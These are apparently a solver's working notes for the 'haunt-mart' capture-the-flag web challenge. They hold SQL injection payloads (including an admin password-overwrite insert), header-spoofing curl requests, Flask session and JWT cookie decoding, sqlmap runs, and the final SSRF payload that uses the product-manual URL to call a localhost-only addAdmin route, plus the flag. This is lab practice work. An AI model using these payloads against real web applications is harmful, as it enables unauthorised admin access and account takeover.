# haunt-mart

## Solution

```py
# util.py

def isFromLocalhost(func):
    @wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != "127.0.0.1":
            return abort(403)
        return func(*args, **kwargs)

    return check_ip
```

```py
# added logging
import logging

logging.basicConfig(filename='database.log', encoding='utf-8', level=logging.DEBUG)

def query(query, args=(), one=False):
    cursor = mysql.connection.cursor()
    cursor.execute(query, args)
    logging.debug(f'{cursor._executed}')

    rv = [dict((cursor.description[idx][0], value)
        for idx, value in enumerate(row)) for row in cursor.fetchall()]
    return (rv[0] if rv else None) if one else rv
```

```sh
curl 'http://localhost:1337/home'
curl 'http://localhost:1337/addAdmin?username=barrett'
curl --header "X-Forwarded-For: 1.2.3.4" "http://localhost:1337/addAdmin?username=barrett"
```

can't add manual url of `../../../../../../etc/passwd`

as well as use alias of localhost like `127.1` or `::1` since it does `local_filename = url.split("/")[-1]` later

from prior ctf:

```sql
-- register username as 
junk_user"="junk_user","junk_pwd") UNION ALL SELECT 'admin','bad_hash' ON DUPLICATE KEY UPDATE password='$2b$12$QWO1wGzUA7.7N3PNmiCruuLyQVuCTlunOE24zry0J1zGZHUauVARG'-- "

-- hashed password = guest
```


http://localhost:1337/console, need pin...

need to get /addAdmin working...this makes no sense...blueprint -> `/api` prefix needed

```sh
curl -H "X-Forwarded-For: 127.0.0.1" "http://localhost:1337/api/addAdmin?username=barrett"
# forbidden...
```

```sh
python3 /opt/sqlmap/sqlmap.py -r login-req.txt --level=5 risk=3 --ignore-code 401
python3 /opt/sqlmap/sqlmap.py -r register-req.txt --level=5 risk=3 --ignore-code 401
```

```sql
-- ' or ''&'
SELECT username, role FROM users WHERE username = 'admin' AND password = '\\' or \\'\\'&\\''

junk_user"="junk_user","junk_pwd") UNION ALL SELECT 'admin','bad_hash' ON DUPLICATE KEY UPDATE password='password'-- "
INSERT INTO users(username, password, role) VALUES(\'junk_user\\"=\\"junk_user\\",\\"junk_pwd\\") UNION ALL SELECT \\\'admin\\\',\\\'bad_hash\\\' ON DUPLICATE KEY UPDATE password=\\\'password\\\'-- \\"\', \'password\', \'user\')
/**/

-- query('INSERT INTO users(username, password, role) VALUES(%s, %s, %s)', (username, password, role,))

-- admin' or --
SELECT username, role FROM users WHERE username = 'admin\\' --' AND password = 'password'

-- user: admin' /*
-- pwd:  */ or 1=1--
SELECT username, role FROM users WHERE username = 'admin\\' /*' AND password = '*/ or 1=1--'

-- user: admin' or 1=1/*
-- SELECT username, role FROM users WHERE username = 'admin\\' or 1=1/*' AND password = 'password'

-- user: admin
-- pwd: or true--
SELECT username, role FROM users WHERE username = 'admin' AND password = 'or true--'

-- " or "" "--
-- SELECT username, role FROM users WHERE username = \'\\" or \\"\\" \\"\' AND password = \'password\''

-- admin' or 1=1 limit 1 --

SELECT username, role FROM users WHERE username = 'admin\\' or 1=1 limit 1 --' AND password = 'password'
```

wait...no admin user is created...so probably not this at all...


```sh
curl -H "X-Forwarded-For: 127.0.0.1" "http:// :1337/api/addAdmin?username=barrett"
# forbidden...
```


```
# barrett,user
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCJyb2xlIjoidXNlciIsImV4cCI6MTY5ODM3NzQ0NH0
.SbHwrs4FFt5FBCRuU1a67-DCsfJsZjb7gvrL31CMn2Y

.eJwVzNEOgiAAQNF_4QOcmLbqFZfBAqcpWY-gJSrawi2x9e_p8707XzAObdWDA6gsqUUkVawIzmcMmcIG92kgEd7i9lVwRPbOMkHpcSv0cbxflqBJLXvSladEnRGxwps63AyqLFgnV0BzfwVodgvikG7YnENauE6kjGk9LQuTqSs23D7TivLm46oZPkaRIJbR_L2b0tAHvz_WOjd2
.ZTra7w
.jn7Hd7PGL3FR1GukZoyU-ktr65M

# barrett,admin
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE2OTgzNzc0NDR9
.LWdwBX7fpe2D2IH741yyTqALhcO_ncgWde74FduXDWo
```

```sh
# barrett,admin
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCAicm9sZSI6ImFkbWluIn0=.d+prK598Npk/7URB7UBgQ4OiTwXdx1fBr1QlY1awU+k=
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCAicm9sZSI6ImFkbWluIn0=.EveWWS8RnvqK1oEAlpICiM2cjitzqtqCPfUJDu44eO8=

curl -H 'Accept: application/json' -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCAicm9sZSI6ImFkbWluIn0=.EveWWS8RnvqK1oEAlpICiM2cjitzqtqCPfUJDu44eO8=" "http://localhost:1337/api/addAdmin?username=barrett"
# forbidden
```

```sql
-- query('INSERT INTO users(username, password, role) VALUES(%s, %s, %s)', (username, password, role,))

-- admin
-- password","admin")--
INSERT INTO users(username, password, role) VALUES('admin', 'password\\',admin)--', 'user')

-- test
-- 
```

```sh
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "http://localhost:1337/api/addAdmin?username=test"
```

```sh
# .eJwVzMEOgiAAgOF34Z5Tw1bdSithoGlm1KVN1EmgtnQltd69PP__vg_oW1k0YAkKjatsx0UoMDq-kRUI1KEmdriLZkjeWerihfGfLG6nOqu3_eXwDzWueINV7keCuFhn9qDQrRU5CxQfgTqFI0CTsxN6FFJPQjo1DWbGq3ggyXNfs369cU74paKy7fz4WvIH0cTrKEQTCuUcfH-uHTZV.ZTroVw.-R4ziQ3PcmvMurwHYtGU4W7gEmk
flask-unsign --decode --cookie '.eJwVzMEOgiAAgOF34Z5Tw1bdSithoGlm1KVN1EmgtnQltd69PP__vg_oW1k0YAkKjatsx0UoMDq-kRUI1KEmdriLZkjeWerihfGfLG6nOqu3_eXwDzWueINV7keCuFhn9qDQrRU5CxQfgTqFI0CTsxN6FFJPQjo1DWbGq3ggyXNfs369cU74paKy7fz4WvIH0cTrKEQTCuUcfH-uHTZV.ZTroVw.-R4ziQ3PcmvMurwHYtGU4W7gEmk'
# {'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCJyb2xlIjoidXNlciIsImV4cCI6MTY5ODM4MDk4M30.X0RARxLTvPmXtBE5WJwlQfosHR_fcrLyLDsM4I-M4k8'}

```

```sql
INSERT INTO ins_duplicate VALUES (4,'Gorilla') 
  ON DUPLICATE KEY UPDATE animal='Gorilla';
-- checks before insert...probably not it...
```

```txt
sql def: name varchar(255) NOT NULL,
try to pop flask debug print?

name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
price: 123
desc: test
url: https://gist.githubusercontent.com/barrettotte/00ff5b876881e5be7b3ea021e5d6fe54/raw/2c839913d13f53ec96fc29bf5d85d8ff473eb471/test.txt

didn't pop flask debug - just returned in console - "Data too long for column 'name' at row 1"

also...pin is not set in ENV
```

```sh
# http request smuggling?

curl "http://localhost:1337/home" \
-b "session=.eJwVzEkOgjAYQOG79ABEkEFdigp_laJMAssWArUMJoKhGO8urt_L90FDL8oO7VApcU0dxn2OIZ5BJRxe0AUGs8EE8UwTG2-VZVKZlkjanoY8XEKLa9bhpnBv_GJjSbWpgUfPi5Q07A-0if4HvCgz_IOnkxmkt14pZLzuyypw-mAUIQlcmCjO36aoZRERa7wfM34Oh4purBh9f8wNNz8.ZTsAtw.D7MFcmlJvV9EMTjtmpgQr_8zIPg"

curl "http://localhost:1337/api/product" -X POST \
-H 'Content-Type: application/json' \
-b "session=.eJwVzEkOgjAYQOG79ABEkEFdigp_laJMAssWArUMJoKhGO8urt_L90FDL8oO7VApcU0dxn2OIZ5BJRxe0AUGs8EE8UwTG2-VZVKZlkjanoY8XEKLa9bhpnBv_GJjSbWpgUfPi5Q07A-0if4HvCgz_IOnkxmkt14pZLzuyypw-mAUIQlcmCjO36aoZRERa7wfM34Oh4purBh9f8wNNz8.ZTsAtw.D7MFcmlJvV9EMTjtmpgQr_8zIPg" \
-d '{"name":"test","price":"test","description":"test","manual":"https://gist.githubusercontent.com/barrettotte/00ff5b876881e5be7b3ea021e5d6fe54/raw/2c839913d13f53ec96fc29bf5d85d8ff473eb471/test.txt"}'

curl "http://localhost:1337/api/product" -X POST -v \
-H 'Content-Type: application/json' \
-H 'Content-Length: 0' \
-b "session=.eJwVzEkOgjAYQOG79ABEkEFdigp_laJMAssWArUMJoKhGO8urt_L90FDL8oO7VApcU0dxn2OIZ5BJRxe0AUGs8EE8UwTG2-VZVKZlkjanoY8XEKLa9bhpnBv_GJjSbWpgUfPi5Q07A-0if4HvCgz_IOnkxmkt14pZLzuyypw-mAUIQlcmCjO36aoZRERa7wfM34Oh4purBh9f8wNNz8.ZTsAtw.D7MFcmlJvV9EMTjtmpgQr_8zIPg" \
-d '{"name":"test","price":"test","description":"test","manual":"https://gist.githubusercontent.com/barrettotte/00ff5b876881e5be7b3ea021e5d6fe54/raw/2c839913d13f53ec96fc29bf5d85d8ff473eb471/test.txt"}'
# 400 bad request

```

```sh
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "http://localhost:1337/api/addAdmin?username=test"
```

Idiot!

```py
def downloadManual(url):
    safeUrl = isSafeUrl(url)
    if safeUrl:
        try:
            local_filename = url.split("/")[-1]
            r = requests.get(url)
            
            with open(f"/opt/manualFiles/{local_filename}", "wb") as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
            return True
        except Exception as e:
            logging.debug(f'download manual failed: {e}')
            return False
    
    return False
```

`r = requests.get(url)` can execute addAdmin...

```
register: barrett/password
login: barrett/password

manual url: http://127.1:1337/api/addAdmin?username=barrett

pops locally, but not remotely????
```

`HTB{A11_55RF_5C4rY_p4tch_3m_411!}`
